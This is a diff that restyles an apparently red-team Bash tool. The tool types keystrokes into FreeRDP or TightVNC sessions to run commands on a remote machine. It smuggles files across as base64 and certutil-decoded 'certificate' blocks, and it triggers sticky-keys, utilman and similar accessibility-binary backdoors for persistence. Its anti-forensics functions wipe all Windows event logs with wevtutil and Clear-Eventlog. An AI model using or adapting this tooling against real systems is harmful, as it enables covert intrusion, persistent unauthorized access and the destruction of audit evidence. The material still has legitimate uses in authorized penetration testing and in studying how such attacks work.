@@ -19,8 +19,8 @@ function check_dependencies() {
 # Helpers functions
 
 function print_status {
-    local status=$1
-    local message=$2
+    local status="${1}"
+    local message="${2}"
 
     # Blue for information
     # Bold Blue for progress
@@ -28,37 +28,37 @@ function print_status {
     # Bold Yellow for warning
     # Bold Red for error
     # * default to white
-    case "$status" in
-        "information") color="\033[34m[*]\033[0m" ;;
-        "progress") color="\033[1;34m[*]\033[0m" ;;
-        "completed") color="\033[1;32m[+]\033[0m" ;;
-        "warning") color="\033[1;33m[!]\033[0m" ;;
-        "error") color="\033[1;31m[-]\033[0m" ;;
-        "*") color="\033[0m" ;;
+    case ${status} in
+        information) color="\033[34m[*]\033[0m" ;;
+        progress) color="\033[1;34m[*]\033[0m" ;;
+        completed) color="\033[1;32m[+]\033[0m" ;;
+        warning) color="\033[1;33m[!]\033[0m" ;;
+        error) color="\033[1;31m[-]\033[0m" ;;
+        *) color="\033[0m" ;;
     esac
 
-    echo -e "$color $message"
+    echo -e "${color} ${message}"
 }
 
 function XDoToolInput {
-    local input=$1
-    local key=$2
+    local input="${1}"
+    local key="${2}"
 
-    if [ "$key" = "return" ]
+    if [ "${key}" = "return" ]
     then
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$input"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
-	elif [ "$key" = "escapechars" ]
+        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type "${input}"
+        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Return
+	elif [ "${key}" = "escapechars" ]
 	then
-		xdotool search --name "$WINDOWNAME" windowfocus windowactivate type -- "$input"
-		xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
-    elif [ "$key" = "copycon" ]
+		xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
+		xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Return
+    elif [ "${key}" = "copycon" ]
     then
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type -- "$input"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
-    elif [ "$key" = "customkey" ]
+        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
+        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Ctrl+Z Return
+    elif [ "${key}" = "customkey" ]
     then
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key "$input"
+        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key "${input}"
     fi
 }
 
@@ -73,49 +73,49 @@ function RandomString {
         string+=${characters:$random_index:1}
     done
 
-    echo "$string"
+    echo "${string}"
 }
 
 function LinesOfLength {
-    local file=$1
+    local file="${1}"
     local counter=1
 
     while read -r line
     do
         ((counter++))
-    done < "$file"
+    done < "${file}"
 
-    echo "$counter"
+    echo "${counter}"
 }
 
 function CmdFile {
-    local file=$1
+    local file="${1}"
 
     print_status "progress" "Executing commands..."
     while read -r line
     do
-        XDoToolInput "$line" "escapechars"
-    done < "$file"
+        XDoToolInput "${line}" "escapechars"
+    done < "${file}"
     print_status "completed" "Task completed!"
 }
 
 function Execute {
-    local commands=$1
-    local method=$2
+    local commands="${1}"
+    local method="${2}"
 
-    case "$method" in
-        "none")
+    case ${method} in
+        none)
             print_status "progress" "Executing commands..."
-            XDoToolInput "$commands" "escapechars"
+            XDoToolInput "${commands}" "escapechars"
             print_status "completed" "Task completed!"
             ;;
-        "dialogbox")
-            DialogBox "$commands"
+        dialogbox)
+            DialogBox "${commands}"
             ;;
-        "runspace")
-            MSBuild "$commands"
+        runspace)
+            MSBuild "${commands}"
             ;;
-        "*")
+        *)
             print_status "error" "Invalid Execution Type!" >&2
             exit 1
             ;;
@@ -123,7 +123,7 @@ function Execute {
 }
 
 function DialogBox {
-    local commands=$1
+    local commands="${1}"
 
     print_status "progress" "Checking one of the lines reaches 260 character limit"
     length=${#commands}
@@ -135,7 +135,7 @@ function DialogBox {
 
     print_status "progress" "Executing commands..."
     XDoToolInput "Super+r" "customkey"
-    XDoToolInput "$commands" "escapechars"
+    XDoToolInput "${commands}" "escapechars"
     print_status "completed" "Task completed!"
 }
 
@@ -148,33 +148,33 @@ function MSBuild {
 }
 
 function OutputRemoteFile {
-    local local_file=$1
-    local remote_file=$2
-    local platform=$3
-    local method=$4
+    local local_file="${1}"
+    local remote_file="${2}"
+    local platform="${3}"
+    local method="${4}"
 
     # TODO: Implement bin2hex method
 
-    case $method in
-        "" | "pwshb64")
-            Base64 "$local_file" "$remote_file" "$platform" "powershell"
+    case ${method} in
+        "" | pwshb64)
+            Base64 "${local_file}" "${remote_file}" "${platform}" "powershell"
             ;;
-        "cmdb64")
-            CopyCon "$local_file" "$remote_file" "$platform" "base64"
+        cmdb64)
+            CopyCon "${local_file}" "${remote_file}" "${platform}" "base64"
             ;;
-        "nixb64")
-            Base64 "$local_file" "$remote_file" "$platform" "console"
+        nixb64)
+            Base64 "${local_file}" "${remote_file}" "${platform}" "console"
             ;;
-        "outfile")
-            PowershellOutFile "$local_file" "$remote_file" "$platform" "text"
+        outfile)
+            PowershellOutFile "${local_file}" "${remote_file}" "${platform}" "text"
             ;;
-        "pwshcertutil")
-            PowershellOutFile "$local_file" "$remote_file" "$platform" "certutil"
+        pwshcertutil)
+            PowershellOutFile "${local_file}" "${remote_file}" "${platform}" "certutil"
             ;;
-        "copycon")
-            CopyCon "$local_file" "$remote_file" "$platform" "text"
+        copycon)
+            CopyCon "${local_file}" "${remote_file}" "${platform}" "text"
             ;;
-        "*")
+        *)
             print_status "error" "Invalid File Transfer Technique!" >&2
             exit 1
             ;;
@@ -182,35 +182,35 @@ function OutputRemoteFile {
 }
 
 function Base64 {
-    local input=$1
-    local output_file=$2
-    local platform=$3
-    local mode=$4
+    local input="${1}"
+    local output_file="$2"
+    local platform="${3}"
+    local mode="${4}"
 
     local random1
     local random2
+    
+    random1=$(RandomString)
+    random2=$(RandomString)
 
     # TODO: Implement encryption method through base64 with -b,--bypass flag
     # iconv -t UTF-16LE file.txt | gzip -c | openssl enc -a -e -A
     # gzip -c file.exe | openssl enc -a -e -A
 
     # Check if input is passed as file
-    if [[ -f "$input" && ("$platform" = "windows" || "$platform" = "linux") && "$mode" = "powershell" ]]
+    if [[ -f "${input}" && ("${platform}" = "windows" || "${platform}" = "linux") && "${mode}" = "powershell" ]]
     then
-        file_type=$(file "$input")
+        file_type=$(file "${input}")
 
-        if [[ "$file_type" == *"ASCII text"* ]]
+        if [[ "${file_type}" == *"ASCII text"* ]]
         then
-            file=$(iconv -f ASCII -t UTF-16LE "$input" | base64 -w 0)
+            file=$(iconv -f ASCII -t UTF-16LE "${input}" | base64 -w 0)
         else
-            file=$(base64 -w 0 "$input")
+            file=$(base64 -w 0 "${input}")
         fi
 
-        random1=$(RandomString)
-        random2=$(RandomString)
-
         base64_decoder=$(cat <<EOF
-\$${random1} = "$file"
+\$${random1} = "${file}"
 [byte[]]\$${random2} = [Convert]::FromBase64String(\$${random1})
 [IO.File]::WriteAllBytes("$output_file", \$${random2})
 EOF
@@ -220,29 +220,29 @@ EOF
         print_status "progress" "Transferring file..."
         while IFS= read -r line
         do
-            XDoToolInput "$line" "return"
-        done <<< "$base64_decoder"
+            XDoToolInput "${line}" "return"
+        done <<< "${base64_decoder}"
         print_status "completed" "File transferred!"
-    elif [[ "$platform" = "linux" && "$mode" = "console" ]]
+    elif [[ "${platform}" = "linux" && "${mode}" = "console" ]]
     then
-        base64_data=$(base64 -w 0 "$input")
+        base64_data=$(base64 -w 0 "${input}")
         while IFS= read -r line
         do
-            XDoToolInput "echo -n $line | base64 -d > $output_file" "return"
-        done <<< "$base64_data"
+            XDoToolInput "echo -n ${line} | base64 -d > ${output_file}" "return"
+        done <<< "${base64_data}"
         print_status "completed" "File transferred!"
     fi
 }
 
 function Bin2Hex {
-    local input=$1
-    local output_file=$2
-    local platform=$3
-    local mode=$4
+    local input="${1}"
+    local output_file="${2}"
+    local platform="${3}"
+    local mode="${4}"
 
     echo "Not implemented"
 
-    data=$(hexdump -v -e '"\" 1/1 "%02x"' "$input")
+    data=$(hexdump -v -e '"\" 1/1 "%02x"' "${input}")
     length=${#data}
 
     # one line HEX value without spaces , columns ,addresses (either echo or tee to logging by appending)
@@ -255,72 +255,73 @@ function Bin2Hex {
 }
 
 function PowershellOutFile {
-    local input=$1
-    local output_file=$2
-    local platform=$3
-    local mode=$4
+    local input="${1}"
+    local output_file="${2}"
+    local platform="${3}"
+    local mode="${4}"
 
-    local random_temp=$(RandomString)
+    local random_temp
+    random_temp=$(RandomString)
 
-    if [[ "$platform" != "windows" && "$platform" != "linux" ]]
+    if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
     then
         print_status "error" "Only windows and linux are supported for this method!"
     fi
 
-    if [ -f "$input" ]
+    if [ -f "${input}" ]
     then
-        if [ "$mode" = "text" ]
+        if [ "${mode}" = "text" ]
         then
-            file_type=$(file "$input")
-            if [[ "$file_type" == *"ASCII text"* ]]
+            file_type=$(file "${input}")
+            if [[ "${file_type}" == *"ASCII text"* ]]
             then
                 print_status "progress" "Checking one of the lines reaches 3477 character limit"
                 while read -r line
                 do
                     length=${#line}
-                    if [ "$length" -ge 3477 ]
+                    if [ "${length}" -ge 3477 ]
                     then
                         print_status "error" "Character Limit reached!"
                         print_status "information" "Use 'pwshcertutil' as a method instead."
                         print_status "information" "Terminating program..."
                         exit 1
                     fi
-                done < "$input"
+                done < "${input}"
 
                 echo print_status "progress" "Transferring file..."
                 XDoToolInput "@'" "escapechars"
                 while read -r line
                 do
-                    XDoToolInput "$line" "return"
-                done < "$input"
+                    XDoToolInput "${line}" "return"
+                done < "${input}"
 
-                XDoToolInput "'@ | Out-File $output_file" "escapechars"
+                XDoToolInput "'@ | Out-File ${output_file}" "escapechars"
             else
                 echo print_status "warning" "This is a binary file! Switching to 'pwshcertutil' method instead..."
-                PowershellOutFile "$input" "$output_file" "$platform" "certutil"
+                PowershellOutFile "${input}" "${output_file}" "${platform}" "certutil"
             fi
 
 
-        elif [ "$mode" = "certutil" ]
+        elif [ "${mode}" = "certutil" ]
         then
             print_status "progress" "Transferring file..."
-            base64_data=$(base64 -w 64 "$input")
+            base64_data=$(base64 -w 64 "${input}")
             XDoToolInput "@'" "escapechars"
             XDoToolInput "-----BEGIN CERTIFICATE-----" "escapechars"
 
             while IFS= read -r line
             do
-                XDoToolInput "$line" "return"
-            done <<< "$base64_data"
+                XDoToolInput "${line}" "return"
+            done <<< "${base64_data}"
 
             XDoToolInput "-----END CERTIFICATE-----" "escapechars"
             XDoToolInput "'@ | Out-File ${random_temp}.txt" "escapechars"
-            XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt $output_file" "return"
+            XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt ${output_file}" "return"
 
             XDoToolInput "Remove-Item -Force ${random_temp}.txt" "return"
-        elif [ "$mode" = "hex" ]
+        elif [ "${mode}" = "hex" ]
         then
-            data=$(hexdump -v -e '"\" 1/1 "%02x"' "$input")
+            data=$(hexdump -v -e '"\" 1/1 "%02x"' "${input}")
             length=${#data}
             # in columns with spaces , without the characters and the addresses
             # (can be used with copycon and outfile)
@@ -338,14 +339,14 @@ function PowershellOutFile {
 }
 
 function CopyCon {
-    local input=$1
-    local output_file=$2
-    local platform=$3
-    local mode=$4
+    local input="${1}"
+    local output_file="${2}"
+    local platform="${3}"
+    local mode="${4}"
 
     local random_temp=$(RandomString)
 
-    if [ "$platform" != "windows" ]
+    if [ "${platform}" != "windows" ]
     then
         print_status "error" "copycon only exists on Windows operating system user!"
         print_status "information" "Use 'pwshb64' as a method instead."
@@ -353,45 +354,45 @@ function CopyCon {
         exit 1
     fi
 
-    if [[ -f "$input" && "$mode" = "text" ]]
+    if [[ -f "${input}" && "${mode}" = "text" ]]
     then
         print_status "progress" "Checking one of the lines reaches 255 character limit"
         while read -r line
         do
             length=${#line}
-            if [ "$length" -ge 255 ]
+            if [ "${length}" -ge 255 ]
             then
                 print_status "error" "Character Limit reached!"
                 print_status "information" "Use 'cmdb64' as a method instead."
                 print_status "information" "Terminating program..."
                 exit 1
             fi
-        done < "$input"
+        done < "${input}"
 
         print_status "progress" "Transferring file..."
-        XDoToolInput "copy con $output_file" "return"
+        XDoToolInput "copy con ${output_file}" "return"
 
-        lines_of_length=$(LinesOfLength "$input")
+        lines_of_length=$(LinesOfLength "${input}")
         counter=1
         while read -r line
         do
-            if [ "$counter" -ne "$lines_of_length" ]
+            if [ "${counter}" -ne "${lines_of_length}" ]
             then
-                XDoToolInput "$line" "return"
+                XDoToolInput "${line}" "return"
             else
-                XDoToolInput "$line" "copycon"
+                XDoToolInput "${line}" "copycon"
             fi
             ((counter++))
-        done < "$input"
-    elif [ "$mode" = "base64" ]
+        done < "${input}"
+    elif [ "${mode}" = "base64" ]
     then
-        file_type=$(file "$input")
+        file_type=$(file "${input}")
 
-        if [[ "$file_type" == *"ASCII text"* ]]
+        if [[ "${file_type}" == *"ASCII text"* ]]
         then
-            string_base64=$(iconv -f ASCII -t UTF-16LE "$input" | base64 -w 64)
+            string_base64=$(iconv -f ASCII -t UTF-16LE "${input}" | base64 -w 64)
         else
-            string_base64=$(base64 -w 64 "$input")
+            string_base64=$(base64 -w 64 "${input}")
         fi
 
         print_status "progress" "Transferring file..."
@@ -400,15 +401,15 @@ function CopyCon {
 
         while IFS= read -r line
         do
-            XDoToolInput "$line" "return"
-        done <<< "$string_base64"
+            XDoToolInput "${line}" "return"
+        done <<< "${string_base64}"
 
         XDoToolInput "-----END CERTIFICATE-----" "copycon"
-        XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt $output_file" "return"
+        XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt ${output_file}" "return"
         XDoToolInput "del /f ${random_temp}.txt" "return"
-    elif [ "$mode" = "hex" ]
+    elif [ "${mode}" = "hex" ]
     then
-        data=$(hexdump -v -e '"\" 1/1 "%02x"' "$input")
+        data=$(hexdump -v -e '"\" 1/1 "%02x"' "${input}")
         # in columns with spaces , without the characters and the addresses
         # (can be used with copycon and outfile)
         # Add a counter after 6 hexadecimal values give two spaces and
@@ -424,8 +425,8 @@ function CopyCon {
 }
 
 function CreateUser {
-    local mode=$1
-    local platform=$2
+    local mode="${1}"
+    local platform="${2}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
@@ -433,25 +434,25 @@ EOF
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "$platform" = "windows" ]
+    if [ "${platform}" = "windows" ]
     then
         echo "Windows"
-    elif [ "$platform" = "linux" ]
+    elif [ "${platform}" = "linux" ]
     then
         echo "Linux"
     fi
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
-        echo "$description"
+        echo "${description}"
     else
         print_status "error" "Invalid mode!"
     fi
 }
 
 function StickyKey {
-    local mode=$1
-    local platform=$2
+    local mode="${1}"
+    local platform="${2}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
@@ -459,16 +460,16 @@ EOF
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "$platform" != "windows" ]
+    if [ "${platform}" != "windows" ]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
         echo "$description"
-    elif [ "$mode" = "backdoor" ]
+    elif [ "${mode}" = "backdoor" ]
     then
         print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
         XDoToolInput "shift shift shift shift shift" "customkey"
@@ -479,8 +480,8 @@ EOF
 }
 
 function UtilityManager {
-    local mode=$1
-    local platform=$2
+    local mode="${1}"
+    local platform="${2}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
@@ -488,16 +489,16 @@ EOF
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "$platform" != "windows" ]
+    if [ "${platform}" != "windows" ]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
-        echo "$description"
-    elif [ "$mode" = "backdoor" ]
+        echo "${description}"
+    elif [ "${mode}" = "backdoor" ]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
         XDoToolInput "Super+u" "customkey"
@@ -508,8 +509,8 @@ EOF
 }
 
 function Magnifier {
-    local mode=$1
-    local platform=$2
+    local mode="${1}"
+    local platform="${2}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
@@ -517,16 +518,16 @@ EOF
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "$platform" != "windows" ]
+    if [ "${platform}" != "windows" ]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
-        echo "$description"
-    elif [ "$mode" = "backdoor" ]
+        echo "${description}"
+    elif [ "${mode}" = "backdoor" ]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
         XDoToolInput "Super+equal" "customkey"
@@ -538,8 +539,8 @@ EOF
 }
 
 function Narrator {
-    local mode=$1
-    local platform=$2
+    local mode="${1}"
+    local platform="${2}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
@@ -547,16 +548,16 @@ EOF
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "$platform" != "windows" ]
+    if [ "${platform}" != "windows" ]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
-        echo "$description"
-    elif [ "$mode" = "backdoor" ]
+        echo "${description}"
+    elif [ "${mode}" = "backdoor" ]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
         XDoToolInput "Super+Return" "customkey"
@@ -567,8 +568,8 @@ EOF
 }
 
 function DisplaySwitch {
-    local mode=$1
-    local platform=$2
+    local mode="${1}"
+    local platform="${2}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
@@ -576,16 +577,16 @@ EOF
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "$platform" != "windows" ]
+    if [ "${platform}" != "windows" ]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
-        echo "$description"
-    elif [ "$mode" = "backdoor" ]
+        echo "${description}"
+    elif [ "${mode}" = "backdoor" ]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
         XDoToolInput "Super+p" "customkey"
@@ -596,34 +597,34 @@ EOF
 }
 
 function Persistence {
-    local persistence_mode=$1
-    local platform=$2
-    local persistence_method=$3
+    local persistence_mode="${1}"
+    local platform="${2}"
+    local persistence_method="${3}"
 
     # -s, --select flag "info,backdoor". For "info" contains the execution commands
     # for both command prompt and powershell. To enumerate, persistence and cleanup
     # For "backdoor" to activate the backdoor
     # TODO: Fill in the rest of the persistence methods
-    case "$persistence_method" in
-        "createuser")
-            CreateUser "$persistence_mode" "$platform"
+    case ${persistence_method} in
+        createuser)
+            CreateUser "${persistence_mode}" "${platform}"
             ;;
-        "sethc")
-            StickyKey "$persistence_mode" "$platform"
+        sethc)
+            StickyKey "${persistence_mode}" "${platform}"
             ;;
-        "utilman")
-            UtilityManager "$persistence_mode" "$platform"
+        utilman)
+            UtilityManager "${persistence_mode}" "${platform}"
             ;;
-        "magnifier")
-            Magnifier "$persistence_mode" "$platform"
+        magnifier)
+            Magnifier "${persistence_mode}" "${platform}"
             ;;
-        "narrator")
-            Narrator "$persistence_mode" "$platform"
+        narrator)
+            Narrator "${persistence_mode}" "${platform}"
             ;;
-        "displayswitch")
-            DisplaySwitch "$persistence_mode" "$platform"
+        displayswitch)
+            DisplaySwitch "${persistence_mode}" "${platform}"
             ;;
-        "*")
+        *)
             print_status "error" "Invalid Persistence Technique!" >&2
             exit 1
             ;;
@@ -631,28 +632,28 @@ function Persistence {
 }
 
 function PrivEsc {
-    local elevate_mode=$1
-    local platform=$2
-    local elevate_method=$3
+    local elevate_mode="${1}"
+    local platform="${2}"
+    local elevate_method="${3}"
     # TODO: add -e, --elevated flag
     # -e info -p <windows | linux> -m bypassuac
     echo "Not implemented"
 }
 
 function WevUtil {
-    local mode=$1
+    local mode="${1}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
 )
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
-        echo "$description"
-    elif [ "$mode" = "quick" ]
+        echo "${description}"
+    elif [ "${mode}" = "quick" ]
     then
         Execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
-    elif [ "$mode" = "full" ]
+    elif [ "${mode}" = "full" ]
     then
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
         echo "not implemented"
@@ -663,19 +664,19 @@ EOF
 }
 
 function WinEvent {
-    local mode=$1
+    local mode="${1}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
 )
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
-        echo "$description"
-    elif [ "$mode" = "quick" ]
+        echo "${description}"
+    elif [ "${mode}" = "quick" ]
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
-    elif [ "$mode" = "full" ]
+    elif [ "${mode}" = "full" ]
     then
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
         echo "not implemented"
@@ -686,17 +687,17 @@ EOF
 }
 
 function EventViewer {
-    local mode=$1
+    local mode="${1}"
     local description=$(cat <<<EOF
 "Fill in the description of the technique"
 EOF
 )
 
-    if [ "$mode" = "info" ]
+    if [ "${mode}" = "info" ]
     then
         # TODO: Include information of this technique
         echo ""
-    elif [[ $mode = "" || $mode = "manual" ]]
+    elif [[ ${mode} = "" || ${mode} = "manual" ]]
     then
         DialogBox "eventvwr.msc"
     else
@@ -706,9 +707,9 @@ EOF
 }
 
 function AntiForensics {
-    local antiforensics_mode=$1
-    local platform=$2
-    local antiforensics_method=$3
+    local antiforensics_mode="${1}"
+    local platform="${2}"
+    local antiforensics_method="${3}"
     # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box
     # add flag -a, --antiforensics
 
@@ -718,17 +719,17 @@ function AntiForensics {
     # Batch script
     # Powershell script
     # Bash script
-    case "$antiforensics_method" in
-        "wevutil")
-            WevUtil "$antiforensics_mode" "$platform" "$antiforensics_method"
+    case ${antiforensics_method} in
+        wevutil)
+            WevUtil "${antiforensics_mode}" "${platform}" "${antiforensics_method}"
             ;;
-        "winevent")
-            WinEvent "$antiforensics_mode" "$platform" "$antiforensics_method"
+        winevent)
+            WinEvent "${antiforensics_mode}" "${platform}" "${antiforensics_method}"
             ;;
-        "eventvwr")
-            EventViewer "$antiforensics_mode $platform" "$antiforensics_method"
+        eventvwr)
+            EventViewer "${antiforensics_mode}" "${platform}" "${antiforensics_method}"
             ;;
-        "*")
+        *)
             print_status "error" "Invalid Antiforensic Technique!" >&2
             exit 1
             ;;
@@ -774,41 +775,41 @@ eval set -- "${OPTS}"
 
 while true
 do
-    case "$1" in
+    case ${1} in
         -c | --command)
-            COMMAND=$2
+            COMMAND="${2}"
             shift 2
             ;;
         -i | --input)
-            INPUT=$2
+            INPUT="${2}"
             shift 2
             ;;
         -o | --output)
-            OUTPUT=$2
+            OUTPUT="${2}"
             shift 2
             ;;
         -e | --elevate)
-            ELEVATE=$2
+            ELEVATE="${2,,}"
             shift 2
             ;;
         -s | --select)
-            SELECT=$2
+            SELECT="${2,,}"
             shift 2
             ;;
         -a | --antiforensics)
-            ANTIFORENSICS=$2
+            ANTIFORENSICS="${2,,}"
             shift 2
             ;;
         -p | --platform)
-            PLATFORM=$2
+            PLATFORM="${2,,}"
             shift 2
             ;;
         -m | --method)
-            METHOD=$2
+            METHOD="${2,,}"
             shift 2
             ;;
         -w | --windowname)
-            WINDOWNAME=$2
+            WINDOWNAME="${2}"
             shift 2
             ;;
         -h | --help)
@@ -819,7 +820,7 @@ do
             break
             ;;
         *)
-            echo "Invalid option: $1" >&2
+            echo "Invalid option: ${1}" >&2
             exit 1
             ;;
     esac
@@ -828,76 +829,76 @@ done
 function main() {
     check_dependencies
 
-    if [ -z "$WINDOWNAME" ]
+    if [ -z "${WINDOWNAME}" ]
     then
         WINDOWNAME="FreeRDP"
-    elif [[ "$WINDOWNAME" != "freerdp" && "$WINDOWNAME" != "tightvnc" ]]
+    elif [[ "${WINDOWNAME}" != "freerdp" && "${WINDOWNAME}" != "tightvnc" ]]
     then
         print_status "error" "Invalid window name specified. Allowed values: 'freerdp', or 'tightvnc'."
         exit 1
     fi
 
     # Select graphical remote program to match the window name
-    if [ "$WINDOWNAME" = "freerdp" ]
+    if [ "${WINDOWNAME}" = "freerdp" ]
     then
         WINDOWNAME="FreeRDP"
-    elif [ "$WINDOWNAME" = "tightvnc" ]
+    elif [ "${WINDOWNAME}" = "tightvnc" ]
     then
         WINDOWNAME="TightVNC"
     fi
 
     # Operating System
-    if [ -z "$PLATFORM" ]
+    if [ -z "${PLATFORM}" ]
     then
         PLATFORM="windows"
-    elif [[ "$PLATFORM" != "windows" && "$PLATFORM" != "linux" ]]
+    elif [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
     then
         print_status "error" "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
         exit 1
     fi
 
     # Executing commands
-    if [ -f "$COMMAND" ]
+    if [ -f "${COMMAND}" ]
     then
         # Check if a file is passed as input
-        CmdFile "$COMMAND"
+        CmdFile "${COMMAND}"
     fi
 
-    if [[ ! -f "$COMMAND" && -n "$COMMAND" ]]
+    if [[ ! -f "${COMMAND}" && -n "${COMMAND}" ]]
     then
         # When input is string and not a file. It executes command
-        if [ -z "$METHOD" ]
+        if [ -z "${METHOD}" ]
         then
             METHOD="none"
         fi
-        Execute "$COMMAND" "$METHOD"
+        Execute "${COMMAND}" "${METHOD}"
     fi
 
     # File transfer
-    if [[ -f "$INPUT" && -n "$OUTPUT" ]]
+    if [[ -f "${INPUT}" && -n "${OUTPUT}" ]]
     then
-        OutputRemoteFile "$INPUT" "$OUTPUT" "$PLATFORM" "$METHOD"
+        OutputRemoteFile "${INPUT}" "${OUTPUT}" "${PLATFORM}" "${METHOD}"
     fi
 
     # Privilege Escalation
-    if [[ -n "$ELEVATE" && -n "$METHOD" ]]
+    if [[ -n "${ELEVATE}" && -n "${METHOD}" ]]
     then
         # -e info -p <windows | linux> -m bypassuac
-        PrivEsc "$ELEVATE" "$PLATFORM" "$METHOD"
+        PrivEsc "${ELEVATE}" "${PLATFORM}" "${METHOD}"
     fi
 
     # Persistence
-    if [[ -n "$SELECT" && -n "$METHOD" ]]
+    if [[ -n "${SELECT}" && -n "${METHOD}" ]]
     then
         # -s <info | backdoor> -p <windows | linux> -m <persistence_method>
-        Persistence "$SELECT" "$PLATFORM" "$METHOD"
+        Persistence "${SELECT}" "${PLATFORM}" "${METHOD}"
     fi
 
     # Antiforensics
-    if [[ -n "$ANTIFORENSICS" && -n "$METHOD" ]]
+    if [[ -n "${ANTIFORENSICS}" && -n "${METHOD}" ]]
     then
         # -a <info | execute> -p <windows | linux> -m <antiforensics_method>
-        AntiForensics "$ANTIFORENSICS" "$PLATFORM" "$METHOD"
+        AntiForensics "${ANTIFORENSICS}" "${PLATFORM}" "${METHOD}"
     fi
 }
 
